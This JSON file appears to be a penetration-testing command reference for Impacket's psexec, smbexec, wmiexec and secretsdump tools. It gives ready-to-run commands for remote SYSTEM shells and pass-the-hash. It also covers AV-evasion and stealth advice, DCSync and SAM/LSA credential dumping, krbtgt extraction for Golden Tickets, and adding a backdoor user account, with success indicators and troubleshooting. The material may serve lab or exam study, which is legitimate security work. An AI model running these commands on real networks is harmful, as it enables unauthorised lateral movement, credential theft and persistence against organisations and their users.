{
  "metadata": {
    "file_purpose": "Core Impacket lateral movement and credential extraction tools - generic command references for security assessment. These are hub commands that link to specialized variants.",
    "educational_context": "Impacket is a Python library for working with Windows network protocols (SMB, MSRPC, Kerberos). The psexec/smbexec/wmiexec tools execute commands remotely via different protocols. Secretsdump extracts credentials using various methods (DCSync, SAM dump, LSA secrets)."
  },
  "commands": [
    {
      "id": "impacket-psexec",
      "name": "Impacket PSExec - Remote Command Execution",
      "category": "exploitation",
      "subcategory": "lateral-movement",
      "command": "impacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'",
      "description": "Execute commands on remote Windows system via SMB + MSRPC. Creates Windows service, provides interactive shell. Most versatile Impacket execution tool.",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name (NetBIOS or FQDN) or use '.' for local account",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<USERNAME>",
          "description": "Username for authentication (local or domain)",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "Plaintext password. Use single quotes to escape special characters. For PTH, use -hashes flag instead.",
          "example": "P@ssw0rd!",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP address or hostname",
          "example": "10.10.10.75",
          "required": true
        }
      ],
      "flag_explanations": {
        "impacket-psexec": "Python reimplementation of Sysinternals PSExec. Uploads RemComSvc.exe to ADMIN$ share, creates Windows service, provides SYSTEM shell over SMB named pipes. ADVANTAGE: Interactive shell with upload/download capabilities. DISADVANTAGE: Writes exe to disk (may trigger AV). Requires ADMIN$ and IPC$ share access. Standard pentest tool for post-exploitation shell access.",
        "Authentication string format": "'DOMAIN/USER:PASS@TARGET' - CRITICAL: Use SINGLE QUOTES to prevent shell interpretation of special characters (!,$,\\,etc.). For local accounts, use './USER:PASS@TARGET'. For workgroup systems, use 'WORKGROUP/USER:PASS@TARGET'.",
        "-hashes :<NTLM_HASH>": "Pass-the-Hash authentication. Colon prefix required. Example: -hashes :8846f7eaee8fb117ad06bdd830b7586c. Replaces password authentication. Use when you have hash but not plaintext password.",
        "-k": "Use Kerberos authentication instead of NTLM. Requires TGT in KRB5CCNAME environment variable. More stealthy but requires additional setup.",
        "-codec <ENCODING>": "Character encoding for shell (default: utf-8). Use if seeing garbled output. Example: -codec cp850 for Spanish Windows.",
        "-no-pass": "Prompt for password interactively (hidden input). Avoids password in bash history. Combine with -k for Kerberos-only authentication."
      },
      "success_indicators": [
        "C:\\Windows\\system32> prompt appears",
        "Impacket v0.x.x banner displayed",
        "whoami shows: nt authority\\system",
        "Can execute commands (dir, whoami, net user)",
        "Upload/download commands work"
      ],
      "failure_indicators": [
        "[-] SMB SessionError: STATUS_LOGON_FAILURE",
        "[-] SMB SessionError: STATUS_ACCESS_DENIED",
        "[Errno 111] Connection refused",
        "[-] Launching semi-interactive shell - ERROR",
        "[-] RemoteOperations failed"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid credentials. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS> -d <DOMAIN>. Check password case sensitivity. Try local account: './administrator:password@<TARGET>'.",
        "STATUS_ACCESS_DENIED": "User lacks admin rights. Solution: Verify admin access: crackmapexec smb <TARGET> -u <USER> -p <PASS> --local-auth (check for Pwn3d!). User must be in local Administrators group or Domain Admins. Try different user or escalate privileges.",
        "Connection refused": "SMB port 445 blocked. Verify: sudo nmap -p 445 -Pn <TARGET>. Check firewall rules. Try alternative tools: wmiexec (uses 135+random RPC) or smbexec (service-based).",
        "ERROR: Shell failed to launch": "RemComSvc.exe blocked by AV or service creation failed. Solution: Use impacket-smbexec (fileless) or impacket-wmiexec (WMI-based) as alternatives. These don't write exe to disk.",
        "Special characters break command": "Password contains special chars. ALWAYS use single quotes: 'domain/user:P@ss!@target'. If single quote in password, escape: 'domain/user:P@ss'\"'\"'word@target'."
      },
      "prerequisites": [],
      "next_steps": [
        "ad-lsass-dump-procdump",
        "ad-sam-dump-reg-save",
        "windows-search-sensitive-files"
      ],
      "alternatives": [
        "impacket-smbexec",
        "impacket-wmiexec",
        "ad-pass-the-hash-impacket-psexec"
      ],
      "tags": [
        "IMPACKET",
        "LATERAL_MOVEMENT",
        "PSEXEC",
        "SMB",
        "REMOTE_EXECUTION",
        "LINUX",
        "KALI"
      ],
      "notes": "MOST VERSATILE Impacket execution method. Provides interactive SYSTEM shell, file upload/download, and stable connection. WHEN TO USE: After validating admin credentials, for interactive post-exploitation (dumping SAM, searching files, installing persistence). WHY PSEXEC: Interactive shell is easier than semi-interactive wmiexec/smbexec. DISADVANTAGES: Writes RemComSvc.exe to disk (may trigger AV), creates Windows service (logged in Event ID 7045). Time estimate: 5-10 seconds for shell.\n\nMANUAL ALTERNATIVES:\n\nPass-the-Hash (when you have NTLM hash):\nimpacket-psexec -hashes :<NTLM_HASH> 'corp.com/admin@10.10.10.75'\n\nLocal account authentication:\nimpacket-psexec './administrator:P@ssw0rd@10.10.10.75'\n\nKerberos authentication (requires TGT):\nexport KRB5CCNAME=admin.ccache\nimpacket-psexec -k -no-pass 'corp.com/admin@DC1.corp.com'\n\nExecute single command and exit:\nimpacket-psexec 'corp.com/admin:pass@10.10.10.75' whoami\n\nUse different service name (stealth):\nModify source: impacket-psexec changes service name in RemCom*.exe\n\nAV EVASION: If PSExec blocked, use:\n1. impacket-smbexec (creates service but no exe on disk)\n2. impacket-wmiexec (pure WMI, no service, no exe)\n3. CrackMapExec with --exec-method smbexec/wmiexec\n\nCOMMAND REFERENCE:\n- Upload file: put local_file remote_path\n- Download file: get remote_path local_file  \n- Exit: exit or Ctrl+C\n\nTIME ESTIMATE: 5-10 seconds (connection + shell), 1-2 seconds per command executed",
      "filled_example": "impacket-psexec 'corp.com/administrator:P@ssw0rd!@10.10.10.75'"
    },
    {
      "id": "impacket-smbexec",
      "name": "Impacket SMBExec - Fileless Remote Execution",
      "category": "exploitation",
      "subcategory": "lateral-movement",
      "command": "impacket-smbexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'",
      "description": "Execute commands remotely via SMB service creation. Fileless alternative to psexec - creates service but no executable written to disk. Better AV evasion.",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name or '.' for local account",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<USERNAME>",
          "description": "Username for authentication",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "Plaintext password (use single quotes for special characters)",
          "example": "P@ssw0rd!",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP address or hostname",
          "example": "10.10.10.75",
          "required": true
        }
      ],
      "flag_explanations": {
        "impacket-smbexec": "Fileless command execution via SMB. Creates a Windows service that executes commands through cmd.exe and returns output via SMB named pipes. ADVANTAGE: No exe written to disk (better AV evasion). DISADVANTAGE: Semi-interactive shell (slower than psexec). Output batched instead of real-time. Requires ADMIN$ and IPC$ shares. Preferred when PSExec blocked by AV.",
        "-hashes :<NTLM_HASH>": "Pass-the-Hash authentication. Use when you have hash but not password. Format: -hashes :8846f7eaee8fb117ad06bdd830b7586c (colon prefix required).",
        "-mode <share|server>": "Execution mode. share (default): Use ADMIN$ share for output. server: Start local SMB server for output retrieval. Use 'server' if ADMIN$ disabled.",
        "-shell-type <cmd|powershell>": "Shell type. cmd (default): Classic cmd.exe. powershell: PowerShell shell (better for modern Windows post-exploitation)."
      },
      "success_indicators": [
        "C:\\Windows\\system32> prompt appears",
        "Semi-interactive shell established",
        "Commands execute with output",
        "whoami shows: nt authority\\system",
        "No exe written to ADMIN$ share"
      ],
      "failure_indicators": [
        "STATUS_LOGON_FAILURE",
        "STATUS_ACCESS_DENIED",
        "Connection refused",
        "Service creation failed",
        "Output retrieval timeout"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid credentials. Verify: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "STATUS_ACCESS_DENIED": "User lacks admin rights. Verify membership in local Administrators or Domain Admins.",
        "Service creation failed": "Service name collision or disabled service manager. Solution: Retry (service name randomized). If persists, use wmiexec.",
        "Slow response / output timeout": "Expected for smbexec - semi-interactive shell batches output. Use wmiexec for faster execution or psexec for real-time output.",
        "ADMIN$ share disabled": "Use -mode server flag to run local SMB server for output retrieval instead of ADMIN$ share."
      },
      "prerequisites": [],
      "next_steps": [
        "ad-lsass-dump-procdump",
        "ad-sam-dump-reg-save",
        "windows-search-sensitive-files"
      ],
      "alternatives": [
        "impacket-psexec",
        "impacket-wmiexec"
      ],
      "tags": [
        "IMPACKET",
        "LATERAL_MOVEMENT",
        "SMBEXEC",
        "SMB",
        "FILELESS",
        "AV_EVASION"
      ],
      "notes": "BEST FOR AV EVASION. No executable written to disk - just service creation and deletion. WHEN TO USE: When psexec is blocked by AV, when you want lower forensic footprint, when ADMIN$ writeable but exe execution monitored. DISADVANTAGES: Semi-interactive shell (slower than psexec), output batched (not real-time), no file upload/download. WHY IT WORKS: Creates service pointing to cmd.exe with commands as parameters - Windows doesn't flag this as suspicious. Time estimate: 5-10 seconds per command (slower than psexec).\n\nMANUAL ALTERNATIVES:\n\nPass-the-Hash:\nimpacket-smbexec -hashes :<NTLM_HASH> 'corp.com/admin@10.10.10.75'\n\nLocal account:\nimpacket-smbexec './administrator:P@ssw0rd@10.10.10.75'\n\nPowerShell shell (better for modern commands):\nimpacket-smbexec -shell-type powershell 'corp.com/admin:pass@10.10.10.75'\n\nUse local SMB server (if ADMIN$ disabled):\nimpacket-smbexec -mode server 'corp.com/admin:pass@10.10.10.75'\n\nSingle command execution:\nimpacket-smbexec 'corp.com/admin:pass@10.10.10.75' 'whoami /all'\n\nCOMPARISON:\npsexec: Writes exe, interactive, fast, file transfer\nsmbexec: No exe, semi-interactive, slower, no file transfer, BETTER AV EVASION  \nwmiexec: No exe, semi-interactive, different protocol (WMI), BEST AV EVASION\n\nTIME ESTIMATE: 5-10 seconds per command (slower than psexec due to batched output)",
      "filled_example": "impacket-smbexec 'corp.com/administrator:P@ssw0rd!@10.10.10.75'"
    },
    {
      "id": "impacket-wmiexec",
      "name": "Impacket WMIExec - WMI Remote Execution",
      "category": "exploitation",
      "subcategory": "lateral-movement",
      "command": "impacket-wmiexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'",
      "description": "Execute commands remotely via Windows Management Instrumentation (WMI). Fileless, serviceless, stealthiest Impacket execution method. Uses DCOM on port 135 + ephemeral RPC.",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name or '.' for local account",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<USERNAME>",
          "description": "Username for authentication",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "Plaintext password (use single quotes)",
          "example": "P@ssw0rd!",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP address or hostname",
          "example": "10.10.10.75",
          "required": true
        }
      ],
      "flag_explanations": {
        "impacket-wmiexec": "WMI-based command execution. Uses DCOM to invoke Win32_Process.Create method remotely. ADVANTAGES: (1) No exe written to disk, (2) No service created (stealthier than psexec/smbexec), (3) Uses WMI (port 135 + dynamic RPC) instead of SMB 445, (4) Different event logs (WMI provider instead of service creation). DISADVANTAGES: Semi-interactive shell, no file upload/download, slower than psexec. Preferred when SMB is blocked but RPC is available.",
        "-hashes :<NTLM_HASH>": "Pass-the-Hash authentication. Example: -hashes :8846f7eaee8fb117ad06bdd830b7586c",
        "-shell-type <cmd|powershell>": "Shell type. cmd (default): cmd.exe shell. powershell: PowerShell shell (recommended for modern Windows).",
        "-codec <ENCODING>": "Output encoding. Default: utf-8. Use cp850 for international Windows systems.",
        "-nooutput": "Execute command without retrieving output. Use for fire-and-forget commands (e.g., add user, enable RDP). Faster but blind."
      },
      "success_indicators": [
        "C:\\> prompt appears (note: different from psexec's C:\\Windows\\system32>)",
        "Commands execute successfully",
        "whoami shows: nt authority\\system (if using admin creds)",
        "No service creation events in Windows logs",
        "No exe files written to target"
      ],
      "failure_indicators": [
        "STATUS_LOGON_FAILURE",
        "STATUS_ACCESS_DENIED",
        "[-] DCOM SessionError",
        "Connection refused",
        "[-] WMI SessionError"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid credentials. Verify: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "STATUS_ACCESS_DENIED": "User lacks DCOM permissions. Solution: Verify admin rights. WMI requires local Administrator or Domain Admin. Check with: crackmapexec winrm <TARGET> -u <USER> -p <PASS>",
        "Connection refused": "WMI port blocked (135 or ephemeral RPC ports). Solution: Verify firewall: sudo nmap -p 135,445 -Pn <TARGET>. WMI requires port 135 + ephemeral high ports (49152-65535). If only 445 open, use psexec/smbexec.",
        "DCOM SessionError": "WMI service disabled or DCOM misconfigured. Solution: Use psexec/smbexec as alternative. Or enable WMI on target (requires prior access).",
        "Very slow execution": "Normal for wmiexec - semi-interactive shell with output batching. Each command creates new WMI process. Use -nooutput flag for fire-and-forget commands."
      },
      "prerequisites": [],
      "next_steps": [
        "ad-lsass-dump-procdump",
        "ad-sam-dump-reg-save",
        "windows-search-sensitive-files"
      ],
      "alternatives": [
        "impacket-psexec",
        "impacket-smbexec",
        "ad-pass-the-hash-impacket-wmiexec"
      ],
      "tags": [
        "IMPACKET",
        "LATERAL_MOVEMENT",
        "WMI",
        "WMIEXEC",
        "FILELESS",
        "STEALTH"
      ],
      "notes": "STEALTHIEST Impacket execution method. No exe, no service, uses WMI instead of SMB. WHEN TO USE: (1) Maximum stealth required, (2) SMB port 445 blocked but RPC available, (3) psexec/smbexec blocked by AV or HIPS. DISADVANTAGES: Semi-interactive (slower), no file transfer, requires RPC ports 135 + ephemeral. WHY STEALTHY: WMI is legitimate admin tool - creates Event ID 5857/5858 (WMI activity) instead of 7045 (service creation). Blends with normal sysadmin activity. Time estimate: 5-15 seconds per command.\n\nMANUAL ALTERNATIVES:\n\nPass-the-Hash:\nimpacket-wmiexec -hashes :<NTLM_HASH> 'corp.com/admin@10.10.10.75'\n\nLocal account:\nimpacket-wmiexec './administrator:P@ssw0rd@10.10.10.75'\n\nPowerShell shell (recommended):\nimpacket-wmiexec -shell-type powershell 'corp.com/admin:pass@10.10.10.75'\n\nFire-and-forget (no output retrieval):\nimpacket-wmiexec -nooutput 'corp.com/admin:pass@10.10.10.75' 'net user hacker P@ss123 /add'\n\nSingle command execution:\nimpacket-wmiexec 'corp.com/admin:pass@10.10.10.75' 'whoami /all'\n\nWMI PERSISTENCE (advanced):\n# Create WMI event subscription for persistence\nimpacket-wmiexec 'corp.com/admin:pass@10.10.10.75' 'powershell -c \"<WMI persistence payload>\"'\n\nCOMPARISON TABLE:\nPSExec: Fast, interactive, writes exe, creates service, SMB-only\nSMBExec: Slower, semi-interactive, NO exe, creates service, SMB-only  \nWMIExec: Slower, semi-interactive, NO exe, NO service, WMI protocol, STEALTHIEST\n\nPORT REQUIREMENTS:\nPSExec/SMBExec: TCP 445 (SMB)\nWMIExec: TCP 135 (DCOM) + TCP 49152-65535 (ephemeral RPC)\n\nTIME ESTIMATE: 5-15 seconds per command (slower than psexec, similar to smbexec)",
      "filled_example": "impacket-wmiexec 'corp.com/administrator:P@ssw0rd!@10.10.10.75'"
    },
    {
      "id": "impacket-secretsdump",
      "name": "Impacket Secretsdump - Credential Extraction",
      "category": "post-exploit",
      "subcategory": "credential-dumping",
      "command": "impacket-secretsdump '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'",
      "description": "Extract credentials from Windows systems using multiple methods: DCSync (DRSUAPI), SAM dump, LSA secrets, cached credentials. Swiss-army knife for Windows credential extraction.",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name (for AD targets) or '.' for local SAM dump",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<USERNAME>",
          "description": "Username with appropriate privileges (Domain Admin for DCSync, local admin for SAM)",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "Plaintext password (use single quotes for special characters)",
          "example": "P@ssw0rd!",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP - Domain Controller for DCSync, workstation/server for SAM dump",
          "example": "10.10.10.70",
          "required": true
        }
      ],
      "flag_explanations": {
        "impacket-secretsdump (no flags)": "Automatic mode - tries ALL extraction methods: (1) DCSync via DRSUAPI (if targeting DC), (2) SAM dump via registry remote access, (3) LSA secrets (cached domain creds), (4) NTDS.dit dump (if DC). Output contains all discovered hashes. ADVANTAGE: Comprehensive one-command extraction. DISADVANTAGE: Noisy (generates multiple log events). For targeted extraction, use specific flags.",
        "-just-dc": "DCSync ONLY mode - extract all domain credentials via DRSUAPI replication. Requires Domain Admin privileges and DC as target. Outputs hundreds/thousands of hashes for large domains. Use when targeting AD domain controller.",
        "-just-dc-user <USERNAME>": "DCSync single user - extract specific account (e.g., krbtgt, Administrator). RECOMMENDED for security work - faster, quieter, targeted. Example: -just-dc-user krbtgt for Golden Ticket preparation.",
        "-sam": "Dump SAM database only (local accounts). Requires local admin. Use when targeting workstations/member servers. Extracts local user NTLM hashes.",
        "-lsa": "Dump LSA secrets only - includes cached domain credentials, service account passwords, machine account passwords. Useful for lateral movement credential discovery.",
        "-hashes :<NTLM_HASH>": "Pass-the-Hash authentication. Example: -hashes :8846f7eaee8fb117ad06bdd830b7586c. Use when you have hash but not password.",
        "-ntds <NTDS_FILE>": "Offline NTDS.dit processing. Requires NTDS.dit and SYSTEM hive extracted from DC. Example: -ntds ntds.dit -system system.hive LOCAL. For offline analysis after NTDS.dit exfiltration."
      },
      "success_indicators": [
        "Output: '[*] Dumping Domain Credentials' (for DCSync)",
        "Output: '[*] Dumping local SAM hashes' (for SAM dump)",
        "Output: '[*] Dumping LSA Secrets' (for LSA dump)",
        "Hash format: username:uid:lmhash:nthash::: (Hashcat mode 1000 compatible)",
        "Output includes: Administrator, krbtgt, computer accounts ($)",
        "Output ends with: '[*] Cleaning up...'"
      ],
      "failure_indicators": [
        "STATUS_LOGON_FAILURE - invalid credentials",
        "STATUS_ACCESS_DENIED - insufficient privileges",
        "ERROR_DS_DRA_ACCESS_DENIED - not Domain Admin (DCSync)",
        "Connection refused - SMB/RPC blocked",
        "RemoteOperations failed"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid credentials. Verify: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "ERROR_DS_DRA_ACCESS_DENIED (0x2105)": "DCSync requires Domain Admin. Verify: crackmapexec smb <DC> -u <USER> -p <PASS> --groups. User must have DS-Replication-Get-Changes rights (Domain Admins by default).",
        "STATUS_ACCESS_DENIED (SAM dump)": "Requires local Administrator. Verify admin rights: crackmapexec smb <TARGET> -u <USER> -p <PASS> --local-auth (look for Pwn3d!).",
        "Connection refused": "SMB port 445 blocked. Verify: sudo nmap -p 445,135 -Pn <TARGET>. secretsdump requires SMB + RPC access.",
        "Empty output": "No credentials found OR specific dump method failed. Try explicit flags: -sam (local SAM), -just-dc (DCSync), -lsa (LSA secrets). Automatic mode may silently skip failed methods."
      },
      "prerequisites": [],
      "next_steps": [
        "windows-hashcat-crack-ntlm",
        "ad-pass-the-hash-impacket-psexec",
        "ad-golden-ticket-mimikatz-create"
      ],
      "alternatives": [
        "ad-dcsync-secretsdump-user",
        "ad-dcsync-secretsdump-all",
        "crackmapexec-sam-dump"
      ],
      "tags": [
        "IMPACKET",
        "CREDENTIAL_DUMPING",
        "SECRETSDUMP",
        "DCSYNC",
        "SAM",
        "LSA"
      ],
      "notes": "SWISS-ARMY KNIFE for credential extraction. Automatically tries all methods - DCSync (if DC), SAM dump, LSA secrets, cached credentials. WHEN TO USE: (1) After gaining admin access, (2) For comprehensive credential harvest, (3) When unsure which extraction method to use. PRACTICAL TIP: For exam, use targeted flags: -just-dc-user krbtgt (Golden Ticket), -sam (local accounts on workstations), -just-dc (full domain dump for labs). Automatic mode is comprehensive but noisier. Time estimate: 2-120 seconds depending on mode and domain size.\n\nMANUAL ALTERNATIVES:\n\nDCSync specific user (RECOMMENDED for pentest):\nimpacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@10.10.10.70'\n\nDCSync all domain users:\nimpacket-secretsdump -just-dc 'corp.com/admin:pass@10.10.10.70'\n\nLocal SAM dump (workstation/server):\nimpacket-secretsdump './administrator:P@ssw0rd@10.10.10.100' -sam\n\nLSA secrets only (cached creds):\nimpacket-secretsdump './administrator:P@ssw0rd@10.10.10.100' -lsa\n\nPass-the-Hash:\nimpacket-secretsdump -hashes :<NTLM> 'corp.com/admin@10.10.10.70'\n\nOffline NTDS.dit processing:\nimpacket-secretsdump -ntds ntds.dit -system system.hive LOCAL\n\nSave output to files:\nimpacket-secretsdump -just-dc 'corp.com/admin:pass@dc' -outputfile corp_dump\n# Creates: corp_dump.ntds, corp_dump.secrets, corp_dump.cached\n\nUSE CASES BY TARGET:\nDomain Controller \u2192 -just-dc or -just-dc-user (DCSync)\nWorkstation/Server \u2192 -sam (local accounts) or default (tries all)\nOffline NTDS.dit \u2192 -ntds + -system flags\n\nOUTPUT PARSING:\nExtract NTLM hashes only:\nimpacket-secretsdump -just-dc 'corp/admin:pass@dc' | cut -d':' -f4 > ntlm.txt\n\nFind specific user:\nimpacket-secretsdump -just-dc 'corp/admin:pass@dc' | grep -i administrator\n\nTIME ESTIMATE: \nDCSync single user: 2-10 seconds\nDCSync full domain: 30 seconds - 15 minutes (size dependent)\nSAM dump: 5-15 seconds\nAutomatic mode: 10-60 seconds",
      "filled_example": "impacket-secretsdump 'corp.com/administrator:P@ssw0rd!@10.10.10.70'"
    },
    {
      "id": "psexec",
      "name": "PSExec Remote Shell (Impacket)",
      "category": "exploitation",
      "subcategory": "lateral-movement",
      "command": "impacket-psexec '<DOMAIN>/<USER>:<PASS>@<TARGET>'",
      "example": "impacket-psexec 'corp.local/admin:Password123!@10.10.10.70'",
      "description": "Execute commands remotely via SMB using PSExec technique. Gets SYSTEM shell on target.",
      "tags": [
        "IMPACKET",
        "LATERAL_MOVEMENT",
        "PSEXEC",
        "SMB"
      ],
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name (. for local)",
          "example": "corp.local",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "admin",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123!",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "10.10.10.70",
          "required": true
        }
      ],
      "flag_explanations": {
        "-hashes": "Use NTLM hash instead of password: -hashes :<NTLM>"
      },
      "success_indicators": [
        "C:\\Windows\\system32>",
        "Microsoft Windows"
      ],
      "failure_indicators": [
        "STATUS_ACCESS_DENIED",
        "Connection refused"
      ],
      "notes": "Requires admin access and ADMIN$ share. Creates Windows service on target. Alternative to evil-winrm when WinRM not available.",
      "filled_example": "impacket-psexec 'corp.local/admin:Password123!@10.10.10.70'"
    },
    {
      "id": "secretsdump",
      "name": "Secretsdump Credential Extraction (Impacket)",
      "category": "exploitation",
      "subcategory": "credential-dumping",
      "command": "impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<TARGET>'",
      "example": "impacket-secretsdump 'corp.local/admin:Password123!@10.10.10.70'",
      "description": "Extract credentials from target (DCSync, SAM dump, LSA secrets)",
      "tags": [
        "IMPACKET",
        "CREDENTIAL_DUMPING",
        "DCSYNC",
        "SAM"
      ],
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "corp.local",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "admin",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123!",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "10.10.10.70",
          "required": true
        }
      ],
      "flag_explanations": {
        "-just-dc": "DCSync only (Domain Controllers)",
        "-just-dc-user <user>": "DCSync specific user (e.g., krbtgt)",
        "-sam": "Dump local SAM database",
        "-hashes": "Use NTLM hash: -hashes :<NTLM>"
      },
      "success_indicators": [
        "Dumping Domain Credentials",
        ":::"
      ],
      "failure_indicators": [
        "STATUS_ACCESS_DENIED",
        "ERROR"
      ],
      "notes": "Use -just-dc-user krbtgt for Golden Ticket hash. See impacket-secretsdump for detailed documentation.",
      "filled_example": "impacket-secretsdump 'corp.local/admin:Password123!@10.10.10.70'"
    }
  ]
}